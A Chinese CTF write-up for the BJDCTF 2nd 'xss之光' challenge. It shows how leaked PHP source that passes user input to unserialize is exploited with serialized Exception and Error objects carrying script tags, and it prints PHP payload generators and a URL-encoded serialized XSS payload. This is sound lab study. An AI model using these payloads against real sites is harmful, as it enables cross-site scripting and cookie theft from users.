* # BJDCTF 2nd

* ## 0x01 xss之光

  关键词：xss，反序列化，php原生类

  打开界面，没有任何可利用信息，猜测为git泄露

  采用GitHack下载源码

  ```
  <?php
  $a = $_GET['yds_is_so_beautiful'];
  echo unserialize($a);
  ```

  发现`unserialize`函数但并没有pop链，考虑用php原生类进行反序列化xss攻击。

  调用__toString魔术方法的原生类：

  * Error（适用于php7）

    XSS（开启报错的情况下）

    ```
    <?php
    $a = new Error("<script>alert(1)</script>");
    $b = serialize($a);
    echo urlencode($b);
    ```

  * Exception（适用于php5、7版本）

    XSS（开启报错的情况下）

    ```
    <?php
    $a = new Exception("<script>alert(1)</script>");
    $b = serialize($a);
    echo urlencode($b);
    ```

  因而构造xss跳转完成xss攻击，payload：

  ```
  <?php
  $a = new Exception("<script>window.location.href = https://www.baidu.com</script>");
  $b = serialize($a);
  echo urlencode($b);
  ?>
  ```

  反序列化后成为：

  ```
  O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A61%3A%22%3Cscript%3Ewindow.location.href+%3D+https%3A%2F%2Fwww.baidu.com%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A34%3A%22C%3A%5Cphpstudy_pro%5CWWW%5Cxsspayload.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
  ```

  最终在cookie中获取flag

  ![image-20210326135630996](C:\Gitbook\Import\heart1ess_s_ctf\assets\bjd2-1.png)

  
